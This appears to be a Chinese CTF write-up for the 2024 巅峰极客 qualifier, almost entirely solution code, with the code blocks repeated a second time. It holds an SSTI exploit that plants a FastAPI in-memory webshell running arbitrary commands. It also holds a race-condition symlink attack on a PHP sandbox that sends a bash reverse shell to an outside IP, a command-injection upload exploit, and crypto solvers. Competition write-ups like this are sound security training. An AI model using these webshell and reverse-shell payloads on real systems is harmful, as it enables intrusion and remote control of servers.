# 2024巅峰极客挑战赛-初赛Write up

> 原文: https://www.ctfiot.com/200261.html
> ID: 200261

Web

EncirclingGame

直接玩，游戏很简单一分钟搞定：

GoldenHornKing

ssti但是没回显，正好这两天分析python各个框架内存马，直接上个fastapi内存马即可。

import requests

url = "http://eci-2zeaztk8i992b5ljndsb.cloudeci1.ichunqiu.com:8000/"

def render(calc):
    print(requests.get(f"{url}calc", params={"calc_req": calc}).text)

code = '''import sys
async def ttt(x: str):
    return __import__("os").popen(x).read()

print(sys.modules["__main__"].app.add_api_route("/x", ttt))'''
print(render(f"""app.__init__.__globals__['__builtins__']['exec']('''{code}''')"""))
print(requests.get(f"{url}x?x=cat /flag").text)
# "flag{b5ae36fc-bae6-4363-af0c-58b748848019}"

from flask import Flask, request, session, redirect, url_for, render_template
import os
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
working_id = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        id = request.form['id']
        if not id.isalnum() or len(id) != 8:
            return '无效的ID'
        session['id'] = id
        if not os.path.exists(f'/sandbox/{id}'):
            os.popen(f'mkdir /sandbox/{id} && chown www-data /sandbox/{id} && chmod a+w /sandbox/{id}').read()
        return redirect(url_for('sandbox'))
    return render_template('submit_id.html')

@app.route('/sandbox', methods=['GET', 'POST'])
def sandbox():
    if request.method == 'GET':
        if 'id' not in session:
            return redirect(url_for('index'))
        else:
            return render_template('submit_code.html')
    if request.method == 'POST':
        if 'id' not in session:
            return 'no id'
        user_id = session['id']
        if user_id in working_id:
            return 'task is still running'
        else:
            working_id.append(user_id)
            code = request.form.get('code')
            os.popen(f'cd /sandbox/{user_id} && rm *').read()
            os.popen(f'sudo -u www-data cp /app/init.py /sandbox/{user_id}/init.py && cd /sandbox/{user_id} && sudo -u www-data python3 init.py').read()
            os.popen(f'rm -rf /sandbox/{user_id}/phpcode').read()
          
            php_file = open(f'/sandbox/{user_id}/phpcode', 'w')
            php_file.write(code)
            php_file.close()

            result = os.popen(f'cd /sandbox/{user_id} && sudo -u nobody php phpcode').read()
            os.popen(f'cd /sandbox/{user_id} && rm *').read()
            working_id.remove(user_id)

            return result

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)

import random, threading, requests

def test():
    s = requests.session()
    id = str(random.randint(88888888, 99999999))
    s.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/", data={"id": id})
    code = '''<?php while (true) {symlink("/usr/bin/mkdir", "/sandbox/12345678/phpcode");} ?>'''
    s.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/sandbox", {"code": code})

for i in range(20):
    threading.Thread(target=test).start()

s1 = requests.session()
s1.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/", data={"id": "12345678"})

while True:
    code = f'''#!/bin/sh
bash -c 'bash -i >&/dev/tcp/8.134.146.39/6667 0>&1'''
    data = {"code": code}
    print(s1.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/sandbox", data=data).text)

import requests

url = "http://eci-2zeaaalzdwwdkv13li2v.cloudeci1.ichunqiu.com/upload.php"

def test():
    for i in range(32,128):
        if len(requests.post(url,files={"file": ("x","11111")}, data={"cmd": f"{chr(i)}"}).text) != 57:
            print(chr(i))

test()

import threading, requests

url = "http://eci-2zeaaalzdwwdkv13li2v.cloudeci1.ichunqiu.com/upload.php"

def getflag():
    while True:
        print(requests.post(url,files={"file": ("m",'find / -name "flag" -exec cat {} ;')}, data={"cmd": f". /t*/*"}).text)

for i in range(5):
    threading.Thread(target=getflag).start()
getflag()

backdoorplus

题目主体是一个ECDSA，最后又进行了RSA的加密过程，要想解RSA需要得到p，也就是k2的值。

k1 = random_k
z = (k1 - w * t) * G + (-a * k1 - b) * Y
#Y = X * G
#t = 1
#z = k1G - wG - ak1XG -bXG
zx = z.x() % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)

a = 751818
b = 1155982
w = 908970521
x = 20391992
sig_r = 6052579169727414254054653383715281797417510994285530927615
p = generator_192.curve().p()
E_a = generator_192.curve().a()
b = generator_192.curve().b()
E = EllipticCurve(GF(p),[E_a,b])
G = E([generator_192.x(), generator_192.y()])
k1G = E.lift_x(sig_r)
z = k1G - w*G - a*x*k1G -b*x*G
n = G.order()
zx = int(z[0]) % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)

p1 = k2 * G
r = int(p1[0]) % n
print(r)
#3839784391338849056467977882403235863760503590134852141664

p = k2
for i in range(99):
    p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p)
n = p * q
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m=int(pow(c,d,n))
# print(long_to_bytes(m))
for i in trange(99999):
    m += n
    if b'flag' in long_to_bytes(m):
        print(long_to_bytes(m))

from sage.all import*
from ecdsa import *
from Crypto.Util.number import *
import gmpy2 
import hashlib

a = 751818
b = 1155982
w = 908970521
x = 20391992
sig_r = 6052579169727414254054653383715281797417510994285530927615
c = 1294716523385880392710224476578009870292343123062352402869702505110652244504101007338338248714943
e = 65537
p = generator_192.curve().p()
E_a = generator_192.curve().a()
E_b = generator_192.curve().b()
E = EllipticCurve(GF(p),[E_a,E_b])
G = E([generator_192.x(), generator_192.y()])
k1G = E.lift_x(sig_r)
z = k1G - w*G - a*x*k1G -b*x*G
n = G.order()
zx = int(z[0]) % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)

p = k2
for i in range(99):
    p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p)
n = p * q
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m=int(pow(c,d,n))
# print(long_to_bytes(m))
for i in trange(99999):
    m += n
    if b'flag' in long_to_bytes(m):
        print(long_to_bytes(m))
#flag{0c75afae-f8ad-4df1-b2d9-a9ca348cb226}

import hashlib
cipher = "EB74464F7924C56210CBFFC5A239BE0399ED2C8FB9542BA7C58A7E560F352CA03EE5E00A6EA938CF85F882C799D78BC682225428F4E556D047F15E5766855C04660DC72181954CF9976E5705CBAA483D2AAB5A69283D68E4F74C23CFA8C226D0F941E7F4FF9960F1DA677E9DBF9814B5B3E2D799074AC0120F212F3A52C37FE335D56DB4BD214600049F7F950C01FABD8625065607304F17AEF3C0F0177F9B3EBDE5663346606CB307F1645F006DB088F34F7D44BE9543A1393B29506D1D31814460FE7BAC48BDBB8E354128E7535CE73B1618C594D9D1B9BF7148A7D77077E9A7FFA0BE1CFA9800FE3364F9E7304557974045E0C950B8F3444432C16AB7DDEE371F6026FA2D6FC143598A9EE9E12736EABD515BAE24BB03E4C062DDC263F4A18C3E5C10A4CC88E19B04592B864AC883D8B994EEB2C46496B3416B000C9A344A4F3CF2C30DA6DD57B7D3701CDCB9418EAE8A0470C2AD2668ECF0E3AE6B6A29F6AE3C23E30F42571DFC507171D173F928718E2A5D18C43F7A5B20E125A6421EFBEFA5034BF44B5E66EF90124EE2CFFD9AACE7C49356A64ADFFBA0D44D29B125AB8E98386ED91129B0197AE9A642C173578EFD4784D1EE087CE765A714640F9AA867A4AD879229F1712037D522B5226B2DC7440EFCB753EC8A52C29CF1FB9BD85FA65FDA70B1261E143F9406D00D90AA0F55310652F3F908D7C1E5A841F77EBD3014FCA23CB223F8915D7730AFC7276F1C0FC7EA33A3083553D2684D964EC7E4A9205DEE6FCFEADA8B589CF48326AF2DEBF56DB42A4DFDF74BF9CB0A34BFD97B90B83E17E31FE0A48B54C94AC4175B46302D5E8B38D7CB42E618AEC9197D43B1B36891A18CDC5CA57F20284187FE6988D860ED46076F779B088D2FA78A798A55DCC6E657E8B101A23B9F8ADE02F696D905F63C626C3E07FD06002B2030B20FAFF02625D9B875A4B74DD421CCB5411CC309EBE7CC75BED408F9F486E6CFFF4F14AC36DFFB643C2721A3AD4CA95415D59CF3C3EE85FF75F2BC6FFD1FC09499544B7218F5937E8B73C7764DEBC840266B14F3D049AE9511AB135CC764C5C6F10C87C087BC8D3181D7470630D4A983FE401F46C99F4A52D81E8D4146211BFA28AE52C9D0E3974AFB2D830F443136F4464DDFEFA30688BE27A8A0158A85B8040C2C04598F2111751D296F862FFEBC2FB50D6530FE6C09D70F54664ED2F2C44365D647B3E6D5BB45707C8B18C8A248B153309605B34ED9CEF42172114F52AE47E8063131EFB2F1AD55868D648722111B00CFE2132463F9659AA1F8298ED2FBD1239071DC3ACF63661C77A5ACBB54410FF3F7CFA1701040BD2D2C8F721A37E310A84605845E7202DB021B2346A1BB920AE80DD0066F05A0524BC80339ED9932542883473FEFCA18C1C8B8C9B0E31B7169BAC1F1B9697B2799BDB869006C16C49B77525AB7546FE3345E5F01A5E248FB966B7592D2A0DA0BED3E27F6C789647FDE73F59258FFC6A638758661126FC03D24226DA7295EBDF50C52D96631B5804D02CDF2DC89FA6063CA2D00953200BED4BF734CEDBA0C56A185C46CB60ABCDD8C611E4203B4E0F217FA14389FB1A49C03180CC616C730FA48B1B96EB17D7B3BDFD9B6A7D646A57C976DD592A3F022A15399A1C37140E1897B231918DC2F2257DD2CC33FADEF99939CE9EB676674458ED487984E9F8D2C7DF23D8093940FEAB586D0E674B6B2416125DED9C2386A247F1D87BAD1CAB640579EAE3050FFD0A8AEDF52254AA5E9186F060C97150EC26626CC8451C47569764B281667A54428E096A20A5D81EB4D"
cipher = [cipher[i:i+64]for i in range(0, len(cipher), 64)]

def encrypt(data):
    data_bytes = data.encode()
    hash = hashlib.sha256()
    hash.update(data_bytes)
    enc = list(hash.digest())
    for i in range(len(enc)):
        enc[i] = enc[i] ^ data_bytes[i % len(data_bytes)]
    result = bytes(enc).hex().upper()
    return result

flag = "flag{"
table = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
for i in range(3,40):
    for c in table:
        for e in cipher:
            str = flag[i] + flag[i+1] + c
            str_enc = encrypt(str)
            #print(str + ' : ' + str_enc)
            #print(e)
            if(str_enc == e):
                flag += c
                #print(c)
print(flag)

flag{194a39a4-7937-48fb-bfea-80bd17729f8a}


```
import requests

url = "http://eci-2zeaztk8i992b5ljndsb.cloudeci1.ichunqiu.com:8000/"

def render(calc):
    print(requests.get(f"{url}calc", params={"calc_req": calc}).text)

code = '''import sys
async def ttt(x: str):
    return __import__("os").popen(x).read()

print(sys.modules["__main__"].app.add_api_route("/x", ttt))'''
print(render(f"""app.__init__.__globals__['__builtins__']['exec']('''{code}''')"""))
print(requests.get(f"{url}x?x=cat /flag").text)
# "flag{b5ae36fc-bae6-4363-af0c-58b748848019}"
```



```
from flask import Flask, request, session, redirect, url_for, render_template
import os
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
working_id = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        id = request.form['id']
        if not id.isalnum() or len(id) != 8:
            return '无效的ID'
        session['id'] = id
        if not os.path.exists(f'/sandbox/{id}'):
            os.popen(f'mkdir /sandbox/{id} && chown www-data /sandbox/{id} && chmod a+w /sandbox/{id}').read()
        return redirect(url_for('sandbox'))
    return render_template('submit_id.html')

@app.route('/sandbox', methods=['GET', 'POST'])
def sandbox():
    if request.method == 'GET':
        if 'id' not in session:
            return redirect(url_for('index'))
        else:
            return render_template('submit_code.html')
    if request.method == 'POST':
        if 'id' not in session:
            return 'no id'
        user_id = session['id']
        if user_id in working_id:
            return 'task is still running'
        else:
            working_id.append(user_id)
            code = request.form.get('code')
            os.popen(f'cd /sandbox/{user_id} && rm *').read()
            os.popen(f'sudo -u www-data cp /app/init.py /sandbox/{user_id}/init.py && cd /sandbox/{user_id} && sudo -u www-data python3 init.py').read()
            os.popen(f'rm -rf /sandbox/{user_id}/phpcode').read()
          
            php_file = open(f'/sandbox/{user_id}/phpcode', 'w')
            php_file.write(code)
            php_file.close()

            result = os.popen(f'cd /sandbox/{user_id} && sudo -u nobody php phpcode').read()
            os.popen(f'cd /sandbox/{user_id} && rm *').read()
            working_id.remove(user_id)

            return result

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
```



```
import random, threading, requests

def test():
    s = requests.session()
    id = str(random.randint(88888888, 99999999))
    s.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/", data={"id": id})
    code = '''<?php while (true) {symlink("/usr/bin/mkdir", "/sandbox/12345678/phpcode");} ?>'''
    s.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/sandbox", {"code": code})

for i in range(20):
    threading.Thread(target=test).start()

s1 = requests.session()
s1.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/", data={"id": "12345678"})

while True:
    code = f'''#!/bin/sh
bash -c 'bash -i >&/dev/tcp/8.134.146.39/6667 0>&1'''
    data = {"code": code}
    print(s1.post("http://eci-2ze6b395o5a6d7fdywnb.cloudeci1.ichunqiu.com/sandbox", data=data).text)
```



```
import requests

url = "http://eci-2zeaaalzdwwdkv13li2v.cloudeci1.ichunqiu.com/upload.php"

def test():
    for i in range(32,128):
        if len(requests.post(url,files={"file": ("x","11111")}, data={"cmd": f"{chr(i)}"}).text) != 57:
            print(chr(i))

test()
```



```
import threading, requests

url = "http://eci-2zeaaalzdwwdkv13li2v.cloudeci1.ichunqiu.com/upload.php"

def getflag():
    while True:
        print(requests.post(url,files={"file": ("m",'find / -name "flag" -exec cat {} ;')}, data={"cmd": f". /t*/*"}).text)

for i in range(5):
    threading.Thread(target=getflag).start()
getflag()
```



```
k1 = random_k
z = (k1 - w * t) * G + (-a * k1 - b) * Y
#Y = X * G
#t = 1
#z = k1G - wG - ak1XG -bXG
zx = z.x() % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)
```



```
a = 751818
b = 1155982
w = 908970521
x = 20391992
sig_r = 6052579169727414254054653383715281797417510994285530927615
p = generator_192.curve().p()
E_a = generator_192.curve().a()
b = generator_192.curve().b()
E = EllipticCurve(GF(p),[E_a,b])
G = E([generator_192.x(), generator_192.y()])
k1G = E.lift_x(sig_r)
z = k1G - w*G - a*x*k1G -b*x*G
n = G.order()
zx = int(z[0]) % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)
```



```
p1 = k2 * G
r = int(p1[0]) % n
print(r)
#3839784391338849056467977882403235863760503590134852141664
```



```
p = k2
for i in range(99):
    p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p)
n = p * q
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m=int(pow(c,d,n))
# print(long_to_bytes(m))
for i in trange(99999):
    m += n
    if b'flag' in long_to_bytes(m):
        print(long_to_bytes(m))
```



```
from sage.all import*
from ecdsa import *
from Crypto.Util.number import *
import gmpy2 
import hashlib

a = 751818
b = 1155982
w = 908970521
x = 20391992
sig_r = 6052579169727414254054653383715281797417510994285530927615
c = 1294716523385880392710224476578009870292343123062352402869702505110652244504101007338338248714943
e = 65537
p = generator_192.curve().p()
E_a = generator_192.curve().a()
E_b = generator_192.curve().b()
E = EllipticCurve(GF(p),[E_a,E_b])
G = E([generator_192.x(), generator_192.y()])
k1G = E.lift_x(sig_r)
z = k1G - w*G - a*x*k1G -b*x*G
n = G.order()
zx = int(z[0]) % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)

p = k2
for i in range(99):
    p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p)
n = p * q
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m=int(pow(c,d,n))
# print(long_to_bytes(m))
for i in trange(99999):
    m += n
    if b'flag' in long_to_bytes(m):
        print(long_to_bytes(m))
#flag{0c75afae-f8ad-4df1-b2d9-a9ca348cb226}
```



```
import hashlib
cipher = "EB74464F7924C56210CBFFC5A239BE0399ED2C8FB9542BA7C58A7E560F352CA03EE5E00A6EA938CF85F882C799D78BC682225428F4E556D047F15E5766855C04660DC72181954CF9976E5705CBAA483D2AAB5A69283D68E4F74C23CFA8C226D0F941E7F4FF9960F1DA677E9DBF9814B5B3E2D799074AC0120F212F3A52C37FE335D56DB4BD214600049F7F950C01FABD8625065607304F17AEF3C0F0177F9B3EBDE5663346606CB307F1645F006DB088F34F7D44BE9543A1393B29506D1D31814460FE7BAC48BDBB8E354128E7535CE73B1618C594D9D1B9BF7148A7D77077E9A7FFA0BE1CFA9800FE3364F9E7304557974045E0C950B8F3444432C16AB7DDEE371F6026FA2D6FC143598A9EE9E12736EABD515BAE24BB03E4C062DDC263F4A18C3E5C10A4CC88E19B04592B864AC883D8B994EEB2C46496B3416B000C9A344A4F3CF2C30DA6DD57B7D3701CDCB9418EAE8A0470C2AD2668ECF0E3AE6B6A29F6AE3C23E30F42571DFC507171D173F928718E2A5D18C43F7A5B20E125A6421EFBEFA5034BF44B5E66EF90124EE2CFFD9AACE7C49356A64ADFFBA0D44D29B125AB8E98386ED91129B0197AE9A642C173578EFD4784D1EE087CE765A714640F9AA867A4AD879229F1712037D522B5226B2DC7440EFCB753EC8A52C29CF1FB9BD85FA65FDA70B1261E143F9406D00D90AA0F55310652F3F908D7C1E5A841F77EBD3014FCA23CB223F8915D7730AFC7276F1C0FC7EA33A3083553D2684D964EC7E4A9205DEE6FCFEADA8B589CF48326AF2DEBF56DB42A4DFDF74BF9CB0A34BFD97B90B83E17E31FE0A48B54C94AC4175B46302D5E8B38D7CB42E618AEC9197D43B1B36891A18CDC5CA57F20284187FE6988D860ED46076F779B088D2FA78A798A55DCC6E657E8B101A23B9F8ADE02F696D905F63C626C3E07FD06002B2030B20FAFF02625D9B875A4B74DD421CCB5411CC309EBE7CC75BED408F9F486E6CFFF4F14AC36DFFB643C2721A3AD4CA95415D59CF3C3EE85FF75F2BC6FFD1FC09499544B7218F5937E8B73C7764DEBC840266B14F3D049AE9511AB135CC764C5C6F10C87C087BC8D3181D7470630D4A983FE401F46C99F4A52D81E8D4146211BFA28AE52C9D0E3974AFB2D830F443136F4464DDFEFA30688BE27A8A0158A85B8040C2C04598F2111751D296F862FFEBC2FB50D6530FE6C09D70F54664ED2F2C44365D647B3E6D5BB45707C8B18C8A248B153309605B34ED9CEF42172114F52AE47E8063131EFB2F1AD55868D648722111B00CFE2132463F9659AA1F8298ED2FBD1239071DC3ACF63661C77A5ACBB54410FF3F7CFA1701040BD2D2C8F721A37E310A84605845E7202DB021B2346A1BB920AE80DD0066F05A0524BC80339ED9932542883473FEFCA18C1C8B8C9B0E31B7169BAC1F1B9697B2799BDB869006C16C49B77525AB7546FE3345E5F01A5E248FB966B7592D2A0DA0BED3E27F6C789647FDE73F59258FFC6A638758661126FC03D24226DA7295EBDF50C52D96631B5804D02CDF2DC89FA6063CA2D00953200BED4BF734CEDBA0C56A185C46CB60ABCDD8C611E4203B4E0F217FA14389FB1A49C03180CC616C730FA48B1B96EB17D7B3BDFD9B6A7D646A57C976DD592A3F022A15399A1C37140E1897B231918DC2F2257DD2CC33FADEF99939CE9EB676674458ED487984E9F8D2C7DF23D8093940FEAB586D0E674B6B2416125DED9C2386A247F1D87BAD1CAB640579EAE3050FFD0A8AEDF52254AA5E9186F060C97150EC26626CC8451C47569764B281667A54428E096A20A5D81EB4D"
cipher = [cipher[i:i+64]for i in range(0, len(cipher), 64)]

def encrypt(data):
    data_bytes = data.encode()
    hash = hashlib.sha256()
    hash.update(data_bytes)
    enc = list(hash.digest())
    for i in range(len(enc)):
        enc[i] = enc[i] ^ data_bytes[i % len(data_bytes)]
    result = bytes(enc).hex().upper()
    return result

flag = "flag{"
table = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
for i in range(3,40):
    for c in table:
        for e in cipher:
            str = flag[i] + flag[i+1] + c
            str_enc = encrypt(str)
            #print(str + ' : ' + str_enc)
            #print(e)
            if(str_enc == e):
                flag += c
                #print(c)
print(flag)

flag{194a39a4-7937-48fb-bfea-80bd17729f8a}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/6-1724157969.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1724157970.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/4-1724157970.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1724157971.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1724157972.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1724157973.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1724157974.png)